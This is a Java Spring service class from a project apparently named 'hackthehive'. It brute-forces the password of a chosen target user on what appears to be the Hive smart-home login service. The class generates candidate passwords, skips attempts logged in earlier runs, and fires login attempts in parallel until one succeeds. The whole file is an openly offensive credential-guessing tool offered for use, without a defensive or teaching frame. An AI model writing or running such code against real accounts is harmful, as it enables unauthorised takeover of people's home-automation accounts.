package uk.edwinek.hackthehive.service;

import org.springframework.stereotype.Service;
import uk.edwinek.hackthehive.client.HiveClient;
import uk.edwinek.hackthehive.generator.PermutationGenerator;
import uk.edwinek.hackthehive.progress.PreviousProgress;

import java.util.Collections;
import java.util.Optional;
import java.util.Set;

@Service
public class BruteForceImpl implements BruteForce {

    private final HiveClient hiveClient;
    private final PermutationGenerator permutationGenerator;
    private final PreviousProgress previousProgress;
    private final String userToHack;

    BruteForceImpl(final HiveClient hiveClient, final PermutationGenerator permutationGenerator,
                   final PreviousProgress previousProgress, final String userToHack) {
        this.hiveClient = hiveClient;
        this.permutationGenerator = permutationGenerator;
        this.previousProgress = previousProgress;
        this.userToHack = userToHack;
    }

    @Override
    public Optional<String> attemptUserLogin() {
        return permutationsToAttempt().parallelStream().filter(s -> hiveClient.attemptLogin(userToHack, s)).findFirst();
    }

    private Set<String> permutationsToAttempt() {
        Optional<String> success = previousProgress.loadSuccess();
        if (success.isPresent()) {
            return Collections.singleton(success.get());
        }
        Set<String> totalPermutations = permutationGenerator.getPermutations();
        Set<String> previousAttempts = previousProgress.loadAttemptsFromPreviousLog();
        totalPermutations.removeAll(previousAttempts);
        return totalPermutations;
    }
}
